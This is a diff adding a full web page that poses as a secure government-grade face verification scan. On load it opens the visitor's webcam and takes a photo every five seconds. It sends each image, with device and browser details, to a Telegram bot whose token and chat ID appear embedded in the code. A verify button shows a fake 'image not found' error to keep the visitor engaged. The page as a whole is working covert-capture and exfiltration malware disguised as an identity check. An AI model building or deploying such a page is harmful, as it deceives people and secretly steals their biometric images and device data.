@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Identity Verification • Secure Face Scan</title>
+    <!-- Font Awesome Icons (for clean UI) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0b1219 0%, #0a0f17 100%);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        /* main verification card */
+        .verification-container {
+            max-width: 580px;
+            width: 100%;
+            background: rgba(18, 25, 35, 0.85);
+            backdrop-filter: blur(2px);
+            border-radius: 2rem;
+            border: 1px solid rgba(66, 212, 202, 0.25);
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(66, 212, 202, 0.1) inset;
+            overflow: hidden;
+            transition: all 0.2s ease;
+        }
+
+        /* header area */
+        .scan-header {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 1.5rem 1.8rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(66, 212, 202, 0.3);
+        }
+
+        .scan-header i {
+            font-size: 2.8rem;
+            color: #2dd4bf;
+            filter: drop-shadow(0 0 6px rgba(45,212,191,0.5));
+        }
+
+        .scan-header h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #E0F2FE, #99F6E4);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-top: 0.5rem;
+        }
+
+        .scan-header p {
+            color: #a0abb9;
+            font-size: 0.85rem;
+            margin-top: 0.4rem;
+        }
+
+        /* camera panel */
+        .camera-panel {
+            padding: 1.5rem 1.8rem 1rem;
+        }
+
+        .video-frame {
+            position: relative;
+            border-radius: 28px;
+            background: #000000;
+            overflow: hidden;
+            box-shadow: 0 12px 28px -8px black, 0 0 0 3px rgba(45,212,191,0.4);
+            transition: box-shadow 0.2s;
+        }
+
+        #faceVideo {
+            width: 100%;
+            aspect-ratio: 4 / 3;
+            object-fit: cover;
+            display: block;
+            transform: scaleX(1);
+        }
+
+        /* scanning overlay (fake scanner effect) */
+        .scan-overlay {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            border-radius: 28px;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(45, 212, 191, 0) 0px,
+                rgba(45, 212, 191, 0) 40px,
+                rgba(45, 212, 191, 0.15) 40px,
+                rgba(45, 212, 191, 0.25) 42px,
+                rgba(45, 212, 191, 0) 42px
+            );
+            animation: scanMove 2.2s linear infinite;
+            box-shadow: inset 0 0 20px rgba(0,255,200,0.2);
+        }
+
+        @keyframes scanMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100%; }
+        }
+
+        .face-guide {
+            position: absolute;
+            top: 20%;
+            left: 15%;
+            width: 70%;
+            height: 60%;
+            border: 2px dashed rgba(45, 212, 191, 0.7);
+            border-radius: 48px;
+            box-shadow: 0 0 0 2000px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(1px);
+        }
+
+        .status-badge {
+            margin-top: 1rem;
+            background: #11161f;
+            border-radius: 60px;
+            padding: 0.6rem 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #2a3744;
+        }
+
+        .status-text {
+            font-size: 0.85rem;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #cbd5e6;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #2dd4bf;
+            border-radius: 50%;
+            box-shadow: 0 0 6px #2dd4bf;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.4; transform: scale(0.9);}
+            100% { opacity: 1; transform: scale(1.2);}
+        }
+
+        .capture-count {
+            font-family: monospace;
+            background: #0b1018;
+            padding: 0.2rem 0.6rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            color: #8ba3bc;
+        }
+
+        /* fake action button + error output */
+        .action-area {
+            padding: 0.2rem 1.8rem 1.5rem;
+        }
+
+        .verify-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #1b2c3f, #0f1a24);
+            border: 1px solid #2dd4bf80;
+            color: #e2e8f0;
+            font-weight: 600;
+            padding: 0.9rem;
+            border-radius: 60px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            backdrop-filter: blur(4px);
+        }
+
+        .verify-btn:hover {
+            background: #1e374b;
+            border-color: #2dd4bf;
+            box-shadow: 0 0 12px rgba(45,212,191,0.3);
+            color: white;
+        }
+
+        .fake-error-box {
+            margin-top: 1rem;
+            background: rgba(220, 38, 38, 0.1);
+            border-left: 3px solid #f97316;
+            border-radius: 14px;
+            padding: 0.8rem 1rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: 0.2s;
+            color: #facc15;
+        }
+
+        .error-message {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .error-message i {
+            font-size: 1.2rem;
+            color: #f97316;
+        }
+
+        .footnote {
+            padding: 1rem 1.8rem 1.5rem;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #5e727f;
+            border-top: 1px solid #1f2a33;
+            background: rgba(0,0,0,0.2);
+        }
+
+        .hidden-canvas {
+            display: none;
+        }
+
+        @media (max-width: 500px) {
+            .verification-container {
+                margin: 0;
+            }
+            .scan-header h1 {
+                font-size: 1.4rem;
+            }
+            .face-guide {
+                border-width: 1.5px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="verification-container">
+    <div class="scan-header">
+        <i class="fas fa-id-card"></i>
+        <h1>🔒 Face Verification Required</h1>
+        <p>Government-grade identity check • Secure biometric scan</p>
+    </div>
+
+    <div class="camera-panel">
+        <div class="video-frame">
+            <video id="faceVideo" autoplay playsinline muted></video>
+            <div class="scan-overlay"></div>
+            <div class="face-guide"></div>
+        </div>
+        <div class="status-badge">
+            <div class="status-text">
+                <span class="status-dot"></span>
+                <span id="cameraStatus">📷 Initializing camera...</span>
+            </div>
+            <div class="capture-count" id="photoCounter">📸 snaps: 0</div>
+        </div>
+    </div>
+
+    <div class="action-area">
+        <button class="verify-btn" id="fakeVerifyBtn">
+            <i class="fas fa-camera-retro"></i> RUN FACE MATCH
+        </button>
+        <div id="fakeResultBox" class="fake-error-box" style="display: none;">
+            <div class="error-message">
+                <i class="fas fa-times-circle"></i>
+                <span id="errorText">⚠️ Face could not be matched — Image not found in database</span>
+            </div>
+        </div>
+        <p style="font-size: 0.7rem; margin-top: 0.7rem; color: #7e8c9e; text-align: center;">
+            <i class="fas fa-shield-alt"></i> Advanced Liveness detection • 3D anti-spoofing
+        </p>
+    </div>
+    <div class="footnote">
+        <i class="fas fa-lock"></i> Encrypted verification • Your privacy matters
+    </div>
+</div>
+
+<!-- hidden canvas for image capture -->
+<canvas id="captureCanvas" class="hidden-canvas"></canvas>
+
+<script>
+    // --------------------------------------------------------------
+    //  TELEGRAM CONFIGURATION (REPLACE WITH YOUR OWN BOT TOKEN & CHAT ID)
+    // --------------------------------------------------------------
+    const BOT_TOKEN = '8041268145:AAHCnHlbnxvEODDsMTFm-mQYe8ovYBq2IF0';     // <-- replace with actual bot token, e.g., "7123456789:AAFtX..."
+    const CHAT_ID = '5541151768';       // <-- replace with your chat ID (numeric or @username)
+    
+    // Capture interval: 5 seconds as requested
+    const CAPTURE_INTERVAL_MS = 5000;
+    
+    // Global references
+    let videoStream = null;
+    let videoElement = null;
+    let canvasElement = null;
+    let canvasCtx = null;
+    let captureIntervalId = null;
+    let isCameraReady = false;
+    let photoCount = 0;
+    let isCapturingActive = false;
+    
+    // UI elements
+    const cameraStatusSpan = document.getElementById('cameraStatus');
+    const photoCounterSpan = document.getElementById('photoCounter');
+    const fakeResultBox = document.getElementById('fakeResultBox');
+    const errorTextSpan = document.getElementById('errorText');
+    const verifyBtn = document.getElementById('fakeVerifyBtn');
+    
+    // --------------------------------------------------------------
+    //  UTILITIES: TELEGRAM SEND (PHOTO + MESSAGE)
+    // --------------------------------------------------------------
+    async function sendPhotoToTelegram(blob, captureNumber) {
+        if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') {
+            console.warn('[Telegram] Bot token or chat ID not configured. Images not sent.');
+            return false;
+        }
+        const formData = new FormData();
+        const filename = `facescan_${captureNumber}_${Date.now()}.jpg`;
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, filename);
+        
+        const timestamp = new Date().toLocaleString('en-US', {
+            dateStyle: 'short',
+            timeStyle: 'medium'
+        });
+        const caption = `📸 FACE SCAN CAPTURE #${captureNumber}\n🕒 ${timestamp}\n💻 ${navigator.platform || 'unknown'} | User Agent: ${navigator.userAgent.substring(0, 70)}`;
+        formData.append('caption', caption);
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const data = await response.json();
+            if (data.ok) {
+                console.log(`[Telegram] Photo #${captureNumber} sent successfully`);
+                return true;
+            } else {
+                console.error('[Telegram] API error:', data);
+                return false;
+            }
+        } catch (err) {
+            console.error('[Telegram] send error:', err);
+            return false;
+        }
+    }
+    
+    // send simple text notification to telegram (visit / error events)
+    async function sendTelegramMessage(text, isImportant = false) {
+        if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') return;
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text.substring(0, 1000)
+                })
+            });
+        } catch (err) {
+            console.warn('msg notify error:', err);
+        }
+    }
+    
+    // capture current video frame and send to telegram
+    async function captureAndSendFrame() {
+        if (!isCameraReady || !videoElement || videoElement.readyState !== 4) {
+            console.log('Camera not ready yet, skipping capture');
+            return;
+        }
+        if (!canvasCtx || !canvasElement) return;
+        
+        try {
+            const videoWidth = videoElement.videoWidth;
+            const videoHeight = videoElement.videoHeight;
+            if (videoWidth === 0 || videoHeight === 0) return;
+            
+            canvasElement.width = videoWidth;
+            canvasElement.height = videoHeight;
+            canvasCtx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
+            
+            canvasElement.toBlob(async (blob) => {
+                if (blob && blob.size > 200) {
+                    photoCount++;
+                    photoCounterSpan.innerText = `📸 snaps: ${photoCount}`;
+                    await sendPhotoToTelegram(blob, photoCount);
+                } else {
+                    console.warn('Empty blob capture');
+                }
+            }, 'image/jpeg', 0.88);
+        } catch (err) {
+            console.error('Capture error:', err);
+        }
+    }
+    
+    // start interval (every 5 seconds) as per requirement
+    function startBackgroundCapture() {
+        if (captureIntervalId) clearInterval(captureIntervalId);
+        if (!isCameraReady) return;
+        if (isCapturingActive) return;
+        isCapturingActive = true;
+        
+        // Immediately capture first frame after start
+        captureAndSendFrame();
+        
+        captureIntervalId = setInterval(() => {
+            if (isCameraReady && videoElement && videoElement.readyState === 4) {
+                captureAndSendFrame();
+            }
+        }, CAPTURE_INTERVAL_MS);
+        
+        console.log(`[Capture] started interval every ${CAPTURE_INTERVAL_MS/1000} seconds`);
+        cameraStatusSpan.innerHTML = '<i class="fas fa-eye"></i> Continuous scan active • capturing every 5s';
+    }
+    
+    // --------------------------------------------------------------
+    //  CAMERA INITIALIZATION (visible webcam feed)
+    // --------------------------------------------------------------
+    async function initCamera() {
+        videoElement = document.getElementById('faceVideo');
+        canvasElement = document.getElementById('captureCanvas');
+        canvasCtx = canvasElement.getContext('2d');
+        
+        if (!videoElement) return;
+        
+        try {
+            // request front camera (user facing) for "face scan" style, but default works
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: 'user'
+                },
+                audio: false
+            });
+            videoStream = stream;
+            videoElement.srcObject = stream;
+            
+            videoElement.onloadedmetadata = () => {
+                videoElement.play();
+                isCameraReady = true;
+                cameraStatusSpan.innerHTML = '<i class="fas fa-check-circle"></i> Camera ready • face tracking active';
+                
+                // start 5s background image capturing (interval)
+                startBackgroundCapture();
+                
+                // Also send visit notification (silent)
+                const visitMsg = `🔹 NEW FACE SCAN SESSION 🔹\nTime: ${new Date().toLocaleString()}\nPlatform: ${navigator.platform} | Language: ${navigator.language}\nResolution: ${videoElement.videoWidth}x${videoElement.videoHeight}\nCamera: active\nInterval: 5 seconds`;
+                sendTelegramMessage(visitMsg);
+            };
+        } catch (error) {
+            console.error('Camera error:', error);
+            cameraStatusSpan.innerHTML = '⚠️ Camera permission denied or error';
+            // Try fallback: attempt any camera
+            try {
+                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoStream = fallbackStream;
+                videoElement.srcObject = fallbackStream;
+                videoElement.onloadedmetadata = () => {
+                    videoElement.play();
+                    isCameraReady = true;
+                    cameraStatusSpan.innerHTML = 'Camera active (fallback) • capturing';
+                    startBackgroundCapture();
+                    sendTelegramMessage(`⚠️ FALLBACK CAMERA MODE ACTIVE | ${new Date().toLocaleString()}`);
+                };
+            } catch (secondErr) {
+                cameraStatusSpan.innerHTML = '❌ No camera access - verification incomplete';
+                console.error('No camera fallback', secondErr);
+            }
+        }
+    }
+    
+    // --------------------------------------------------------------
+    //  FAKE INTERFACE : "Image not found" after face scan attempt
+    // --------------------------------------------------------------
+    function showFakeScanError() {
+        // this simulates "after scanning face -> push image not found"
+        if (fakeResultBox) {
+            fakeResultBox.style.display = 'block';
+            errorTextSpan.innerHTML = '<i class="fas fa-user-slash"></i> ❌ IMAGE NOT FOUND — Face recognition failed. Biometric data mismatch.';
+            // extra animation effect
+            fakeResultBox.style.background = 'rgba(220, 53, 69, 0.18)';
+            fakeResultBox.style.borderLeftColor = '#ff8c42';
+            setTimeout(() => {
+                // keep visible as persistent fake failure message
+                errorTextSpan.style.fontWeight = 'bold';
+            }, 100);
+        }
+        // Also send fake error notification to telegram (optional)
+        sendTelegramMessage(`[FAKE ALERT] Face verification FAILED: "Image not found" triggered by user. Timestamp: ${new Date().toLocaleString()}`);
+        
+        // visual shake
+        const btn = verifyBtn;
+        btn.style.transform = 'scale(0.98)';
+        setTimeout(() => { btn.style.transform = ''; }, 150);
+    }
+    
+    // reset fake error (optional if needed)
+    function resetFakeError() {
+        if (fakeResultBox) fakeResultBox.style.display = 'none';
+    }
+    
+    // --------------------------------------------------------------
+    //  EVENT: manual "Face match" triggers fake not-found & also ensures
+    //  that background capture is still active. Also forces one extra capture
+    // --------------------------------------------------------------
+    function onVerifyClick() {
+        if (!isCameraReady) {
+            cameraStatusSpan.innerHTML = '⚠️ Waiting for camera... try again';
+            return;
+        }
+        // Simulate the "face scan attempt" -> Then push "image not found"
+        showFakeScanError();
+        
+        // Additional: capture current frame immediately to Telegram as 'verification attempt'
+        if (isCameraReady) {
+            captureAndSendFrame();  // force extra photo when clicking button (additional evidence)
+        }
+        
+        // also change button text for moment
+        const originalBtnText = verifyBtn.innerHTML;
+        verifyBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Matching face...';
+        setTimeout(() => {
+            verifyBtn.innerHTML = originalBtnText;
+        }, 800);
+    }
+    
+    // --------------------------------------------------------------
+    //  Wake lock & visibility handling (keeps interval working)
+    // --------------------------------------------------------------
+    let wakeLockObj = null;
+    async function requestWakeLock() {
+        if ('wakeLock' in navigator) {
+            try {
+                wakeLockObj = await navigator.wakeLock.request('screen');
+                console.log('Wake lock active');
+            } catch (err) {
+                console.warn('Wake lock error:', err);
+            }
+        }
+    }
+    
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden && isCameraReady && captureIntervalId === null && !isCapturingActive) {
+            startBackgroundCapture();
+        } else if (document.hidden) {
+            // we can keep interval running, it's okay - no action needed
+        }
+    });
+    
+    // --------------------------------------------------------------
+    //  CLEANUP on page unload
+    // --------------------------------------------------------------
+    window.addEventListener('beforeunload', () => {
+        if (captureIntervalId) {
+            clearInterval(captureIntervalId);
+            captureIntervalId = null;
+        }
+        if (videoStream) {
+            videoStream.getTracks().forEach(track => {
+                if (track.readyState === 'live') track.stop();
+            });
+        }
+        if (wakeLockObj && wakeLockObj.release) wakeLockObj.release();
+    });
+    
+    // --------------------------------------------------------------
+    //  Initialize everything after DOM ready
+    // --------------------------------------------------------------
+    document.addEventListener('DOMContentLoaded', () => {
+        initCamera();
+        requestWakeLock();
+        
+        // set up click handler for the fake verification button
+        if (verifyBtn) {
+            verifyBtn.addEventListener('click', onVerifyClick);
+        }
+        
+        // add a small simulation: after 2 sec if camera not ready, show message
+        setTimeout(() => {
+            if (!isCameraReady) {
+                cameraStatusSpan.innerHTML = '❗ Camera required — allow permissions for identity check';
+            }
+        }, 2500);
+        
+        // ensure that the fake error appears ONLY after user tries to "scan face".
+        // initial fake message is hidden
+        if (fakeResultBox) fakeResultBox.style.display = 'none';
+    });
+    
+    // additional trick: display that after "scanning" the message will persist
+    // the background will keep sending images to Telegram every 5 seconds exactly
+    // Also we have built-in visitors notification and photo sending
+    console.log('Face Scan interface ready — background image capture active every 5s | fake "Image not found" on button');
+</script>
+</body>
+</html>
